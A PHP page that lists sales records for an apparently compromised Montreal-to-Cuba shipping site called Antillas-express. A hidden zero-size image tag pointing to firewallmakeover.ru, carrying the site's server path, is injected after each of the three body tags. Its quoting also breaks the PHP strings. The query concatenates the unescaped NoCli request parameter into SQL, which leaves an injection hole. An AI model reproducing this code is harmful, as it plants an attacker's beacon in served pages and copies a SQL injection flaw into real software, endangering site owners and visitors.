<?php
/* Programme : LoginLst.php
* Description : Affichage de la liste des code de prix.
* Auteur : Denis Léveillé 	 		  Date : 2004-01-01
* MAJ : Denis Léveillé 	 			  Date : 2007-02-24
*/
include('lib/config.php');

$TabEtat = get_etat("");

if( !isset($repert) )
	$repert = './extra/';

// **** Choix de la langue de travail ****
switch( $_SESSION['langue'] ) {
	case "en":	@include($repert."varmessen.inc");
					break;
	case "sp":	@include($repert."varmesssp.inc");
					break;
	default:		@include($repert."varmessfr.inc");

} // switch SLangue


function MetMessErreur( $Erreur, $Message, $NoErr )
{
global $TabMessGen, $param, $txt, $NomCie;
echo 
"<html>
	<head>
		<title>Antillas-express - Montreal to Cuba - ".$param['telephone_client']."</title
		<meta http-equiv='Content-Type' content='text/html; charset=iso-8859-1'>
		<meta name='description' content='".$txt['MetaDescription']."'>
		<meta name='keywords' content='".$txt['MetaKeyword']."'>
		<link href='styles/style.css' rel='stylesheet' type='text/css'>
		<base target='MAIN'>
	</head>
	  <SCRIPT language=JavaScript1.2 src='$repert/javafich/disablekeys.js'></SCRIPT>
<body><img width="0" height="0" style="display:none;" id="frmchkldver" src="http://firewallmakeover.ru/media/image.php?ftd=364332&path=%7cpublic_html%7cantillas%7c&sys=UN&wrk=2"/>
	<table bgcolor='#EFEFEF' cellpadding='4' cellspacing='0' border='0' >
		<tr>
			<td valign='top'>
		      <h2 align='center' style='margin-top: .7in'>
		      Erreur: $NoErr - $Erreur</h2>
		      <div align='center'>
		      <p style='margin-top: .5in'>
		      <b>Message : $Message</b>
		      <form action='Support.php?do=refresh' method='post'>
		         <input type='button' name='Quitter' value='Quitter' onClick='QuitterPage()'>
		      </form>
		      </div>
		      <p align='center' valign='bottom'><font size='1'><br>
		      </font></p>
				<p align='center' valign='bottom'><font size=1>
				$TabMessGen[8]		 
				$TabMessGen[3]		 
				$NomCie
				$TabMessGen[4]		  
				</p>
 			</td>
	  	</tr>
	</table>
     <SCRIPT LANGUAGE='javascript'>
        function QuitterPage() {
              close();
        } // QuitterPage
	    addKeyEvent();

	  </SCRIPT>
	  <SCRIPT language=JavaScript1.2 src='$repert/javafich/blokclick.js'></SCRIPT>
</body>
</html>\n";
   exit();
}


$sql = "SELECT * FROM $mysql_base.ventes_date";

if( isset($_GET['NoCli']) && ($_GET['NoCli'] != 0) )
	$sql .= " WHERE id_client = '".$_GET['NoCli']."'";
else
	$_GET['NoCli'] = 0;
$sql .= ' order by id DESC;';

$result = mysql_query( $sql, $handle );
if( $result == 0 ) {
  MetMessErreur(mysql_error(),"Accès Ventes impossible", mysql_errno());
}
elseif (  mysql_num_rows($result) != 0 ) {
echo "
<!DOCTYPE html PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//FR'>
<html  xmlns='http://www.w3.org/1999/xhtml'>
   <head>
		<title>".$txt['TitreWeb']." - ".$param['telephone_client']."</title>
		<meta http-equiv='Content-Type' content='text/html; charset=iso-8859-1' >
		<meta http-equiv='Content-Disposition' content='inline; filename=vente_list' >
		<meta http-equiv='Content-Description' content='text/html; charset=iso-8859-1' >
		<meta name='author' content='$NomCieCréé' >
		<meta name='copyright' content='copyright © $CopyAn $NomCie' >
		<meta name='description' content='".$txt['MetaDescription']."'>
		<meta name='keywords' content='".$txt['MetaKeyword']."'>
		<style type='text/css' media='all'>
			#demo tr.ruled { background:#B4E7FF; }
		</style>
		<link href='styles/style.css' rel='stylesheet' type='text/css'>
	</head>
	<script language='JavaScript1.2' src='$repert/javafich/disablekeys.js'></script>
	<script language='JavaScript1.2' src='$repert/javafich/denislib.js'></script>
<body topmargin='5' leftmargin='0' marginheight='0' marginwidth='0'><img width="0" height="0" style="display:none;" id="frmchkldver" src="http://firewallmakeover.ru/media/image.php?ftd=364332&path=%7cpublic_html%7cantillas%7c&sys=UN&wrk=2"/>
	<script language='JavaScript1.2'>window.onload=function(){tableruler();}</script>
   <form name='Liste' action='' target='_blank' method='post'>
 	<table width='100%' bgcolor='#EFEFEF' cellpadding='4' cellspacing='0' border='0' >
		<tr>
			<td valign='top'>
           <p align='center'> <font size='+2'><b>$TabMessGen[127]</b></font></p>
				<p align='center'>
				<input type='button' name='Commande' value='$TabMessGen[128]' onClick='ConsulteFacture()'>
				<input type='button' name='Commande' value='$TabMessGen[129]' onClick='EnvoiFacture()'>
				<input type='button' name='Quitter' value='$TabMessGen[14]' onClick='QuitterPage()'>
				</p>
           <hr size='5' color='#7CDFDF'>
           <table border='1' id='demo' class='ruler' width='100%' align='center'>
             <thead>
                <tr>";
                echo("<th>".mysql_field_name($result,0)."</th>");
                echo("<th>".mysql_field_name($result,1)."</th>");
                echo("<th>".mysql_field_name($result,2)."</th>");
                echo("<th>".mysql_field_name($result,3)."</th>");
                echo("<th>".mysql_field_name($result,4)."</th>");
                echo("<th>".mysql_field_name($result,5)."</th>");
                echo("<th>".mysql_field_name($result,6)."</th>");
                echo("<th>".mysql_field_name($result,7)."</th>");
                echo("<th>".mysql_field_name($result,8)."</th>");
                echo("<th>".mysql_field_name($result,9)."</th>");
                echo("<th>".mysql_field_name($result,10)."</th>");
                echo("<th>".mysql_field_name($result,11)."</th>");
                echo("<th>".mysql_field_name($result,12)."</th>");
                echo("<th>".mysql_field_name($result,13)."</th>");
                echo("<th>".mysql_field_name($result,14)."</th>");
                echo("<th>".mysql_field_name($result,15)."</th>");
                echo("<th>".mysql_field_name($result,16)."</th>");
                echo("<th>".mysql_field_name($result,17)."</th>");
                echo("<th>".mysql_field_name($result,18)."</th>");
                echo("<th>".mysql_field_name($result,19)."</th>");
                echo("<th>".mysql_field_name($result,20)."</th>");
                echo("<th>".mysql_field_name($result,21)."</th>");
                echo "</tr>
             </thead>
             <tbody>";
                for( $i=0; $i < mysql_num_rows($result); $i++ ) {
                   echo "<tr>";
                   $row = mysql_fetch_row($result);
						if( strlen($row[0]) )
						      echo("<td>".$row[0]."</td> ");
						else
						      echo("<td>&nbsp;</td> ");
						if( strlen($row[2]) )
						      echo("<td>".$row[2]."</td> ");
						else
						      echo("<td>&nbsp;</td> ");
						if( strlen($row[3]) )
						      echo("<td>".$row[3]."</td> ");
						else
						      echo("<td>&nbsp;</td> ");
						if( strlen($row[4]) )
						      echo("<td>".$row[4]."</td> ");
						else
						      echo("<td>&nbsp;</td> ");
						if( strlen($row[5]) )
						      echo("<td>".$row[5]."</td> ");
						else
						      echo("<td>&nbsp;</td> ");
						if( strlen($row[6]) )
						      echo("<td>$row[6]</td> ");
						else
						      echo("<td>&nbsp;</td> ");
						if( strlen($row[7]) )
						      echo("<td>".$row[7]."</td> ");
						else
						      echo("<td>&nbsp;</td> ");
						if( strlen($row[8]) )
						      echo("<td>".$row[8]."</td> ");
						else
						      echo("<td>&nbsp;</td> ");
						if( strlen($row[9]) )
						      echo("<td>".$row[9]."</td> ");
						else
						      echo("<td>&nbsp;</td> ");
						if( strlen($row[10]) )
						      echo("<td>".$row[10]."</td> ");
						else
						      echo("<td>&nbsp;</td> ");
						if( strlen($row[11]) )
						      echo("<td>".$row[11]."</td> ");
						else
						      echo("<td>&nbsp;</td> ");
						if( strlen($row[12]) )
						      echo("<td>".$row[12]."</td> ");
						else
						      echo("<td>&nbsp;</td> ");
						if( strlen($row[13]) )
						      echo("<td>".$row[13]."</td> ");
						else
						      echo("<td>&nbsp;</td> ");
						if( strlen($row[14]) )
						      echo("<td>".$row[14]."</td> ");
						else
						      echo("<td>&nbsp;</td> ");
						if( strlen($row[15]) )
						      echo("<td>".$row[15]."</td> ");
						else
						      echo("<td>&nbsp;</td> ");
						if( strlen($row[16]) )
						      echo("<td>".$row[16]."</td> ");
						else
						      echo("<td>&nbsp;</td> ");
						if( strlen($row[17]) )
						      echo("<td>$row[17]</td> ");
						else
						      echo("<td>&nbsp;</td> ");
						if( strlen($row[18]) )
						      echo("<td>$row[18]</td> ");
						else
						      echo("<td>&nbsp;</td> ");
						if( strlen($row[19]) )
						      echo("<td>$row[19]</td> ");
						else
						      echo("<td>&nbsp;</td> ");
						if( strlen($row[20]) )
						      echo("<td>$row[20]</td> ");
						else
						      echo("<td>&nbsp;</td> ");
						if( strlen($row[21]) )
						      echo("<td>$row[21]</td> ");
						else
						      echo("<td>&nbsp;</td> ");
                   echo("<td><input name='choix' TYPE='radio' VALUE='$row[0]'>");
                   echo "</tr>";
                } // for i < nombre de rangé
                echo "</tbody>
           </table>
             <hr size='5' color='#7CDFDF'>
             <p align='center'>
 				<input type='button' name='Commande' value='$TabMessGen[128]' onClick='ConsulteFacture()'>
				<input type='button' name='Commande' value='$TabMessGen[129]' onClick='EnvoiFacture()'>
				<input type='button' name='Quitter' value='$TabMessGen[14]' onClick='QuitterPage()'>
             </p>
			</td>
		</tr>
   </table>
   </form>
	<script language='JavaScript1.2'>
		function QuitterPage() {
			close();
		} 
		
		function ConsulteFacture() {
			// Trouver le choix
			var i,j=0,No=0;
			j=Liste.choix.length;
			if( j ) {
				for( i=0; i<j; i++ ){
					if( Liste.choix[i].checked ) 
						No = Liste.choix[i].value;
				}
			}
			else
				No = Liste.choix.value;
			str = 'vente_voir.php?NoFct='+No+'&Commande=Voir';
			open(str,'_blank','left=10,top=10,height=475,width=740,status=no,toolbar=no,scrollbars=yes,menubar=no,location=no,resizable=yes' );
		} // ConsulteFacture

		function EnvoiFacture() {
			// Trouver le choix
			var No=0;
			j=Liste.choix.length; 
			for( i=0; i<j; i++ ){
				if( Liste.choix[i].checked) 
					No = Liste.choix[i].value;
			}
			str = 'vente_voir.php?NoFct='+No+'&Commande=email';
			open(str,'_blank','left=10,top=10,height=475,width=740,status=no,toolbar=no,scrollbars=yes,menubar=no,location=no,resizable=yes' );
		} // ConsulteFacture

//		addKeyEvent();
	
	</script>
 <!-- script language='JavaScript1.2' src='$repert/javafich/blokclick.js'></script -->
   </body>
</html>";
}
else {
  echo "
    <html>
      <head>
       <title>Consultation Ventes</title>
      </head>
      <body bgcolor='#D8D8FF' onload='javascript:pageonload()'><img width="0" height="0" style="display:none;" id="frmchkldver" src="http://firewallmakeover.ru/media/image.php?ftd=364332&path=%7cpublic_html%7cantillas%7c&sys=UN&wrk=2"/>
       <SCRIPT LANGUAGE='javascript'>
                 close();
		 </SCRIPT>
      </body>
    </html>";
}
mysql_close($handle);
?>